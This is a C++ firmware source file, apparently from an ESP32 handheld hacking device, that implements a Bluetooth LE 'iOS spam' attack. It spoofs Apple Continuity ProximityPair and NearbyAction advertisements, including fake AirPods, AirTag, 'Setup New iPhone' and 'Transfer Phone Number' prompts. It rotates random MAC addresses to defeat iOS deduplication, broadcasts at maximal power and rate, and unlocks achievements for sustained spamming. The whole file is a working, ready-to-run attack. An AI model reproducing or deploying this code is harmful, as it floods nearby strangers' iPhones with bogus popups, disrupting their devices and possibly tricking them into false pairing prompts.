#include "BLEiOSSpamScreen.h"
#include "core/Device.h"
#include "core/ScreenManager.h"
#include "core/AchievementManager.h"
#include "screens/ble/BLEDeviceSpamMenuScreen.h"

extern "C" int ble_hs_id_set_rnd(const uint8_t *addr);

// Apple Continuity ProximityPair device IDs (16-bit, big-endian on the wire)
static const uint16_t kAppleDevices[] = {
  0x0E20, // AirPods Pro
  0x1420, // AirPods Pro 2nd Gen
  0x2420, // AirPods Pro 2nd Gen USB-C
  0x2820, // AirPods 4 ANC
  0x2920, // AirPods 4
  0x2B20, // AirPods Max USB-C
  0x0A20, // AirPods Max
  0x0220, // AirPods
  0x0F20, // AirPods 2nd Gen
  0x1320, // AirPods 3rd Gen
  0x0320, // Powerbeats 3
  0x0B20, // Powerbeats Pro
  0x0C20, // Beats Solo Pro
  0x1120, // Beats Studio Buds
  0x1020, // Beats Flex
  0x0520, // Beats X
  0x0620, // Beats Solo 3
  0x0920, // Beats Studio 3
  0x1720, // Beats Studio Pro
  0x1220, // Beats Fit Pro
  0x1620, // Beats Studio Buds+
  0x2520, // Beats Solo 4
  0x2620, // Beats Solo Buds
  0x2C20, // Beats Powerbeats Pro 2
  0x0055, // AirTag
  0x0030, // Hermes AirTag
};

// Apple Continuity NearbyAction action IDs (with flags)
struct NearbyAction { uint8_t flags; uint8_t action; };
static const NearbyAction kAppleActions[] = {
  {0xC0, 0x13}, // AppleTV AutoFill
  {0xC0, 0x27}, // AppleTV Connecting...
  {0xC0, 0x20}, // Join This AppleTV?
  {0xC0, 0x19}, // AppleTV Audio Sync
  {0xC0, 0x1E}, // AppleTV Color Balance
  {0xC0, 0x09}, // Setup New iPhone
  {0xC0, 0x02}, // Transfer Phone Number
  {0xC0, 0x0B}, // HomePod Setup
  {0xC0, 0x01}, // Setup New AppleTV
  {0xC0, 0x06}, // Pair AppleTV
  {0xC0, 0x0D}, // HomeKit AppleTV Setup
  {0xC0, 0x2B}, // AppleID for AppleTV?
  {0xC0, 0x05}, // Apple Watch
  {0xC0, 0x24}, // Apple Vision Pro
  {0xC0, 0x2F}, // Connect to other Device
  {0x40, 0x21}, // Software Update
  {0xC0, 0x2E}, // Unlock with Apple Watch
  {0xC0, 0x25}, // AirDrop Sidecar
  {0xC0, 0x2C}, // Vision Pro Setup
};

// ── Lifecycle ──────────────────────────────────────────────────────────────

BLEiOSSpamScreen::~BLEiOSSpamScreen()
{
  _stop();
}

void BLEiOSSpamScreen::onInit()
{
  int n = Achievement.inc("ble_ios_spam_first");
  if (n == 1) Achievement.unlock("ble_ios_spam_first");
  _spamStartMs   = millis();
  _spam1minFired = false;

  NimBLEDevice::init("");
  NimBLEDevice::setPower(ESP_PWR_LVL_P9, ESP_BLE_PWR_TYPE_ADV);
  NimBLEDevice::setPower(ESP_PWR_LVL_P9, ESP_BLE_PWR_TYPE_DEFAULT);
  NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);

  _pAdv = NimBLEDevice::getAdvertising();
  _pAdv->setAdvertisementType(BLE_GAP_CONN_MODE_UND); // ADV_IND — iOS reacts to connectable
  _pAdv->setMinInterval(0x20);                        // 20 ms (32 * 0.625)
  _pAdv->setMaxInterval(0x30);                        // 30 ms (48 * 0.625)
  _pAdv->setScanResponse(false);

  _spam();
}

void BLEiOSSpamScreen::onUpdate()
{
  if (Uni.Nav->wasPressed()) {
    auto dir = Uni.Nav->readDirection();
    if (dir == INavigation::DIR_BACK || dir == INavigation::DIR_PRESS) {
      _stop();
      Screen.goBack();
      return;
    }
  }

  uint32_t now = millis();
  if (!_spam1minFired && now - _spamStartMs >= 60000) {
    _spam1minFired = true;
    int m = Achievement.inc("ble_ios_spam_1min");
    if (m == 1) Achievement.unlock("ble_ios_spam_1min");
  }
  // Rotate payload less frequently so the controller pumps many PDUs at 20-30 ms interval
  // between rotations. ~250 ms gives ~8-12 ADV PDUs per payload across all 3 channels.
  if (now - _lastSpamMs >= 250) {
    _lastSpamMs = now;
    _spam();
  }
  if (now - _lastDrawMs >= 2000) {
    _lastDrawMs = now;
    _spinIdx    = (_spinIdx + 1) % 4;
    render();
  }
}

void BLEiOSSpamScreen::onRender()
{
  auto& lcd = Uni.Lcd;

  if (!_chromeDrawn) {
    lcd.fillRect(bodyX(), bodyY(), bodyW(), bodyH(), TFT_BLACK);
    lcd.setTextDatum(BC_DATUM);
    lcd.setTextColor(TFT_DARKGREY, TFT_BLACK);
    lcd.drawString("BACK / ENTER: Stop", bodyX() + bodyW() / 2, bodyY() + bodyH());
    _chromeDrawn = true;
  }

  const int labelH = lcd.fontHeight() + 4;
  const int cy     = bodyY() + bodyH() / 2;

  Sprite sp(&Uni.Lcd);
  sp.createSprite(bodyW(), labelH);
  sp.fillSprite(TFT_BLACK);
  sp.setTextDatum(MC_DATUM);
  sp.setTextColor(TFT_WHITE, TFT_BLACK);
  String label = String("[") + _spinner[_spinIdx] + "] Spamming...";
  sp.drawString(label.c_str(), bodyW() / 2, labelH / 2);
  sp.pushSprite(bodyX(), cy - labelH / 2);
  sp.deleteSprite();
}

// ── Private ────────────────────────────────────────────────────────────────

void BLEiOSSpamScreen::_spam()
{
  if (_pAdv) _pAdv->stop();

  // Rotate static-random MAC per payload — iOS dedupes identical source addrs
  uint8_t addr[6];
  esp_fill_random(addr, 6);
  addr[5] |= 0xC0;
  ble_hs_id_set_rnd(addr);

  NimBLEAdvertisementData advData;
  advData.setFlags(0x06);

  if (random(2) == 0) {
    // Apple Continuity ProximityPair (type 0x07) — AirPods-style popup.
    // Layout: 4C 00 | 07 19 | 07 | DEV_HI DEV_LO | 55 | BATT3 | 00 | 00 | RND16
    //         apple   type+len  prefix  device_id   stat  batt   col  rsv  random
    uint16_t dev = kAppleDevices[random(sizeof(kAppleDevices) / sizeof(kAppleDevices[0]))];
    uint8_t  rnd[19];
    esp_fill_random(rnd, sizeof(rnd));

    uint8_t mfg[29] = {
      0x4C, 0x00,
      0x07, 0x19,
      0x07,
      (uint8_t)(dev >> 8), (uint8_t)(dev & 0xFF),
      0x55,
      rnd[0], rnd[1], rnd[2],
      0x00,
      0x00,
      rnd[3],  rnd[4],  rnd[5],  rnd[6],
      rnd[7],  rnd[8],  rnd[9],  rnd[10],
      rnd[11], rnd[12], rnd[13], rnd[14],
      rnd[15], rnd[16], rnd[17], rnd[18]
    };
    advData.setManufacturerData(std::string((char*)mfg, sizeof(mfg)));
  } else {
    // Apple Continuity NearbyAction (type 0x0F) — action modal popup.
    // Layout: 4C 00 | 0F 05 | FLAGS | ACTION | RND3
    const NearbyAction& a = kAppleActions[random(sizeof(kAppleActions) / sizeof(kAppleActions[0]))];
    uint8_t rnd[3];
    esp_fill_random(rnd, 3);

    uint8_t mfg[9] = {
      0x4C, 0x00,
      0x0F, 0x05,
      a.flags, a.action,
      rnd[0], rnd[1], rnd[2]
    };
    advData.setManufacturerData(std::string((char*)mfg, sizeof(mfg)));
  }

  _pAdv->setAdvertisementData(advData);
  _pAdv->start();
}

void BLEiOSSpamScreen::_stop()
{
  if (_pAdv) {
    _pAdv->stop();
    _pAdv = nullptr;
  }
  NimBLEDevice::deinit(true);
}
